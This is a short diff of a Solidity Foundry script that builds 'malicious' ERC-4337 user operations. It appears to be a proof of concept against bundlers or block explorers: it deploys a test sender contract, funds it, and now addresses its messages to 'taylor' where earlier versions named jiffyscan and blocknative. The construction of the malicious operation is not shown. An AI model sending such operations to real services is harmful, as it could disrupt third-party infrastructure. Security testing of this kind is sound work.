@@ -23,10 +23,13 @@ contract TestScript is Script {
         uint256 privKey = vm.envUint("PRIVATE_KEY");
         address payable beneficiary = payable(vm.addr(vm.envUint("PRIVATE_KEY")));
         vm.startBroadcast(privKey);
-        sender = TestSender(payable(0x477A1860c3aC1920d4Cd6DD2782657342Ff2E640));
+        sender = new TestSender(entrypoint);
+        sender.setOwner(beneficiary);
+        entrypoint.depositTo{value:1e17}(address(sender));
+
         bytes memory data1 = packMaliciousUserOp(
-            2,
-            abi.encodeWithSelector(TestSender.execute.selector, beneficiary, 0, "this one is for you jiffyscan"),
+            0,
+            abi.encodeWithSelector(TestSender.execute.selector, beneficiary, 0, "this one is for you taylor"),
             100000,
             100000,
             100000,
@@ -35,8 +38,8 @@ contract TestScript is Script {
         );
 
         bytes memory data2 = packMaliciousUserOp(
-            3,
-            abi.encodeWithSelector(TestSender.execute.selector, beneficiary, 0, "this one is for you blocknative"),
+            0,
+            abi.encodeWithSelector(TestSender.execute.selector, beneficiary, 0, "this one is for you taylor"),
             100000,
             100000,
             100000,
